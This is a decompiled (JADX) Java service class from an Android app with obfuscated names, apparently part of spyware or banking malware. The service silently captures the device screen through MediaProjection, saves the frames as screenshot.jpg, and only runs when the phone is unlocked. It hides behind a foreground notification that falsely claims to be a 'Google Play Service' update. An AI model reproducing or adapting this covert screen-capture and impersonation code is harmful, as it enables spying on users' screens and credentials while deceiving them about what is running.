package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy;

import android.annotation.TargetApi;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.MediaScannerConnection;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.view.WindowManager;
import java.io.File;
import java.io.FileOutputStream;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.R;

/* JADX INFO: loaded from: classes.dex */
public class jkeggfql extends Service {

    /* JADX INFO: renamed from: a */
    Intent f550a;

    /* JADX INFO: renamed from: c */
    private MediaProjection f552c;

    /* JADX INFO: renamed from: d */
    private VirtualDisplay f553d;

    /* JADX INFO: renamed from: f */
    private Handler f555f;

    /* JADX INFO: renamed from: g */
    private MediaProjectionManager f556g;

    /* JADX INFO: renamed from: h */
    private WindowManager f557h;

    /* JADX INFO: renamed from: i */
    private C0062a f558i;

    /* JADX INFO: renamed from: j */
    private int f559j;

    /* JADX INFO: renamed from: k */
    private Intent f560k;

    /* JADX INFO: renamed from: l */
    private Context f561l;

    /* JADX INFO: renamed from: m */
    private Notification f562m;

    /* JADX INFO: renamed from: e */
    private final HandlerThread f554e = new HandlerThread(getClass().getSimpleName(), 10);

    /* JADX INFO: renamed from: b */
    C0020b f551b = new C0020b();

    /* JADX INFO: Access modifiers changed from: private */
    @TargetApi(21)
    /* JADX INFO: renamed from: c */
    public void m335c() {
        try {
            this.f552c = this.f556g.getMediaProjection(this.f559j, this.f560k);
            this.f558i = new C0062a(this);
            MediaProjection.Callback callback = new MediaProjection.Callback() { // from class: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql.3
                @Override // android.media.projection.MediaProjection.Callback
                public void onStop() {
                    jkeggfql.this.f553d.release();
                }
            };
            this.f553d = this.f552c.createVirtualDisplay("andshooter", this.f558i.m331b(), this.f558i.m332c(), getResources().getDisplayMetrics().densityDpi, 9, this.f558i.m330a(), null, this.f555f);
            this.f552c.registerCallback(callback, this.f555f);
        } catch (Exception e) {
            this.f551b.m230a("error", e.getMessage());
        }
    }

    @TargetApi(21)
    /* JADX INFO: renamed from: d */
    private void m336d() {
        this.f562m = new Notification.Builder(this.f561l).setContentTitle("Info").setContentText("Update Google Play").setSmallIcon(R.drawable.im).build();
        startForeground(9906, this.f562m);
    }

    /* JADX INFO: renamed from: a */
    WindowManager m337a() {
        return this.f557h;
    }

    /* JADX WARN: Type inference failed for: r0v0, types: [wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql$2] */
    /* JADX INFO: renamed from: a */
    void m338a(final byte[] bArr) {
        new Thread() { // from class: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql.2
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                File file = new File(jkeggfql.this.getExternalFilesDir(null), "screenshot.jpg");
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    fileOutputStream.write(bArr);
                    fileOutputStream.flush();
                    fileOutputStream.getFD().sync();
                    fileOutputStream.close();
                    MediaScannerConnection.scanFile(jkeggfql.this, new String[]{file.getAbsolutePath()}, new String[]{"image/jpg"}, null);
                } catch (Exception unused) {
                    jkeggfql.this.f551b.m230a(getClass().getSimpleName().toString(), "Exception writing out screenshot");
                }
            }
        }.start();
    }

    /* JADX INFO: renamed from: b */
    Handler m339b() {
        return this.f555f;
    }

    @Override // android.app.Service
    @TargetApi(21)
    public IBinder onBind(Intent intent) {
        throw new IllegalStateException("");
    }

    @Override // android.app.Service
    @TargetApi(21)
    public void onCreate() {
        super.onCreate();
        this.f561l = this;
        this.f556g = (MediaProjectionManager) getSystemService("media_projection");
        this.f557h = (WindowManager) getSystemService("window");
        this.f554e.start();
        this.f555f = new Handler(this.f554e.getLooper());
    }

    @Override // android.app.Service
    @TargetApi(21)
    public void onDestroy() {
        super.onDestroy();
    }

    /* JADX WARN: Type inference failed for: r1v5, types: [wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql$1] */
    @Override // android.app.Service
    @TargetApi(21)
    public int onStartCommand(Intent intent, int i, int i2) {
        this.f561l = this;
        this.f550a = intent;
        if (intent.getAction() != null) {
            return 2;
        }
        this.f559j = intent.getIntExtra("resultCode", 1337);
        this.f560k = (Intent) intent.getParcelableExtra("resultIntent");
        if (Build.VERSION.SDK_INT >= 26) {
            C0020b c0020b = this.f551b;
            C0020b.m215a((Service) this, "Google", "Update Google Play Service");
        } else {
            m336d();
        }
        new Thread() { // from class: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql.1
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                if (((KeyguardManager) jkeggfql.this.getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                    return;
                }
                jkeggfql.this.m335c();
            }
        }.start();
        return 2;
    }
}
